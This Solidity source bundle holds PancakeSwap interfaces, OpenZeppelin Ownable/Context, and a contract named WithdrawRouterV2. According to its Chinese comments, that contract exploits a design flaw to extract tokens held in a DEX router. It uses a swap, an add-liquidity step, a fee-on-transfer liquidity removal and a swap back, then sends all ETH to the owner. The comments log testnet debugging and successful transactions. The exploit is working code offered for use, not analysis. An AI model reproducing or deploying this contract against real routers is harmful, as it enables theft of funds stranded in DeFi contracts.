pragma solidity >=0.5.0;

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

pragma solidity >=0.5.0;

interface IPancakeCallee {
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

pragma solidity >=0.5.0;

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

pragma solidity >=0.5.0;

interface IPancakePair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

pragma solidity >=0.6.2;

interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

pragma solidity >=0.6.2;

import "./IPancakeRouter01.sol";

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

pragma solidity >=0.5.0;

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
    function balanceOf(address owner) external view returns (uint);
}

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "./IPancakeCallee.sol";
import "./IPancakeRouter02.sol";
import "./IPancakePair.sol";
import "./IPancakeFactory.sol";
import "./IERC20.sol";
import "./IWETH.sol";

contract WithdrawRouterV2 is Ownable {

    // 目标router
    IPancakeRouter02 immutable router;

    // factory
    IPancakeFactory immutable factory;

    // weth
    IWETH immutable WETH;
    
    // pair的映射，缓存一下，同时已缓存的在当前合约中approve了最大值
    mapping(address => address) pairs;

    constructor(address _router) {
        router = IPancakeRouter02(_router);
        factory = IPancakeFactory(IPancakeRouter02(_router).factory());
        WETH = IWETH(IPancakeRouter02(_router).WETH());
    }

    // 接收eth的，不能没有此方法
    receive() external payable {}

    function doWithdraw(address token, uint amount) external payable onlyOwner {
        address pair = pairs[token];
        if (pair == address(0)) { // 加缓存
            pair = factory.getPair(address(WETH), token);
            require(pair != address(0), "pair not exists");
            pairs[token] = pair;
            IPancakePair(pair).approve(address(router), ~uint256(0)); // 三个代币都授权最大值
            IERC20(address(WETH)).approve(address(router), ~uint256(0));
            IERC20(token).approve(address(router), ~uint256(0));
        }        
        WETH.deposit{value: msg.value}(); // 存成weth好操作
        IERC20 iToken = IERC20(token);
        IPancakePair iPair = IPancakePair(pair); // 取到router的token余额
        { // CompilerError: Stack too deep, try removing local variables
            (uint112 reserve0, uint112 reserve1, ) = iPair.getReserves(); // 取到pair中的保留值
            // 最开始这里reserveIn和reserveOut弄反了，导致后面触发not sufficient eth
            (uint reserveIn, uint reserveOut) = iPair.token0() == address(WETH) ? (uint(reserve0), uint(reserve1)) : (uint(reserve1), uint(reserve0)); // 根据情况调换顺序，token0是weth时in为WETH
            // uint amountIn = router.getAmountIn(amount, reserveIn, reserveOut); // 取得要换amount数量的token需要多少weth
            // require(amountIn <= msg.value / 2, "not sufficient eth"); // 还需要添加流动性，所以要保证足量
            if (amount == 0) { // amount为需要闪电贷出来的token数量，一般为1即可，因为只要有1就能把router里的token套出来，但是有些情况1太小导致无法计算出结果时，就需要手动传一个值了
                // 最开始传入1，报错：Pancake: INSUFFICIENT_LIQUIDITY_MINTED。addLiquidity中调用mint时报的
                // 因为Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1)得到的结果等于0导致，需要根据这个反向推导最小的amount
                (amount,,) = calcMinToken(reserveIn, reserveOut, iPair.totalSupply());
            }
            address[] memory path = new address[](2); // 执行交换
            (path[0], path[1]) = (address(WETH), token);
            router.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp); // 执行交换
            // 第二次这里不对，addLiquidity时由router从this转移代币给pair时失败，因为token的transfer有限制，白名单的才能转，打开限制继续进行下一步
            // 结果还不行，最后发现时这里第三个参数原来用的是amount，即传入的值，同时也是通过swapExactTokensForTokens用eth换来的，转入的eth数量是通过换得的token数量amount计算出来的
            // 理论上换完之后得到的就是amount，但是token在交易时内部包含手续费，所以实际得到的balance肯定比amount少，所以传入amount会导致转账失败，超过持有最大数量，这里用balanceOf最准确
            uint tokenAmount = iToken.balanceOf(address(this));
            router.addLiquidity(amount > tokenAmount ? address(WETH) : token, 
                                amount > tokenAmount ? token : address(WETH) , 
                                amount > tokenAmount ? amount : tokenAmount, 
                                amount > tokenAmount ? tokenAmount : amount, 0, 0, address(this), block.timestamp); // 这里可以用router.addLiquidity方法，因为WBNB包含了transferFrom方法，且可以授权，WETH不确定，可能是没有的
            // 这里也失败了一次，因为remove的时候涉及eth的转账，转账到当前合约，最开始合约没有receive方法和fallback方法，导致转账失败，加上之后就好了
            router.removeLiquidityETHSupportingFeeOnTransferTokens(token, iPair.balanceOf(address(this)), 0, 0, address(this), block.timestamp); // 移除流动性，顺便把router中保存的token转移到自己账户，利用设计缺陷
            (path[1], path[0]) = (address(WETH), token); // 拿币换钱
            // 第一次使用方法swapExactTokensForETH报了Pancake: K，这个报错是swap时特有的，问题在哪儿呢？还是token在转账时包含手续费，导致最后用balanceOf计算k值的时候不满足预期，所以在此时就要使用swapExactTokensForETHSupportingFeeOnTransferTokens
            router.swapExactTokensForETHSupportingFeeOnTransferTokens(iToken.balanceOf(address(this)), 0, path, address(this), block.timestamp);
        }
        WETH.withdraw(WETH.balanceOf(address(this))); // 完事之后把当前账户的WETH换钱提出来
        (bool success,) = owner().call{value:address(this).balance}(new bytes(0)); // 执行完成，当前账户的钱转走
        require(success, "transfer failed");
        // 执行成功了，结果：https://testnet.bscscan.com/tx/0x9e332e89c01075ea093159c7dcc68e65f305a136fbc7d3d375b06beef4315fd9
    }

    /**
     * 保留值in，保留值out，lpToken的总量
     * 这里的计算很有意思，需要考虑两个会导致归零的地方
     * 1. 用eth交易token时，换得的token为0
     * 2. 添加流动性时，添加的流动性结果为0
     * 在不考虑手续费的情况下，我们近似计算一下，交换时卖出eth数量与买入token数量的比例应该是reserveEth和reserveToken的比例，要想不出现0，那么需要reserve小的数量为1
     * 再考虑liquidity，liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1); totalSupply为lpTotal
     * 投入eth与reserveEth的数量比例就是liquidity与lpTotal的比例关系
     * 结合两者考虑，得到的比例关系为：eth:token:liquidity = reserveEth:reserveToken:lpTotal
     * 要计算三者最小数量，找到后面三个最小的，再用数量除以这个值即可，下面看下：
     */
    function calcMinToken(uint reserveWeth, uint reserveToken, uint lpTotal) private view returns (uint wethAmount, uint tokenAmount, uint lpAmount) {
        uint min = min(reserveWeth, reserveToken, lpTotal);
        // 这里再乘以2的目的是避免交易手续费产生的影响，有些token收完交易费数量会减少，乘以2可以在收一半交易费时正常工作
        return (reserveWeth * 2 / min, reserveToken * 2 / min, lpTotal * 2 / min);
        // 第一次乘以2之后还不行，分析过程：
        // 1. 计算wethAmount
        // eth:2060085002506370352 = 2
        // token:399624448805645638154 = 193 * 2
        // liquidity:24824840721223173157 = 12 * 2
        // 2. 用eth 2执行swap换token，得到的token数量由于有交易手续费，结果比193 * 2少，实际为349
        // 3. 拿eth 2和token 349添加流动性，因为349对应不了2eth，在_addLiquidity中，会执行判断，先尝试用2 eth对应的应添加的386 token添加流动性，发现实际转移进的token只有349，不足386，会用349反向计算eth数量，得到结果为1 eth + 349 token
        // 4. 添加流动性时使用mint进行分配lp，因为mint时也会取一个最小的eth/ethReserve、token/tokenReserve，这样就得到了小的eth，即按1个eth分配lp token。
        // 5. 最后得到的liquidity就是liquidity/eth，即12，又因为得到12的时候舍去了位数，当反向回来的时候，eht数量就不足1了，因为尾数本来能计算得到一点点lp token的。
        // 即 ceil(liquidity / eth) * eth < liquidity。所以在提取流动性时得到的eth就变为0了，导致提取不出来，报错：'Pancake: INSUFFICIENT_LIQUIDITY_BURNED'：https://testnet.bscscan.com/tx/0x56b90f8143f55d67d2553d985ca47505f87cf171e3ec20acfaf408c06ebba44e
        // 要避免此问题，可以在乘积的地方乘以3，因为有两个舍入误差，所以至少要考虑两次被舍入，故乘以3即可，保险一点乘以4
        // 如果在添加流动性时token0和token1反过来，保证eth不被舍入呢？计算下试试，因为eth放后面，用349 token去计算lp，得到的结果349 * 24824840721223173157 / 399624448805645638154 = 21，提取流动性时就能提取1了，是可以的
        // 添加流动性时eth放后面，但此时当eth是大的token是小值的时候，一样会有两次舍入问题
    }

    function min(uint x, uint y, uint z) private view returns (uint min) {
        min = x;
        min = y < min ? y : min;
        min = z < min ? z : min;
    }

}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../utils/Context.sol";
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

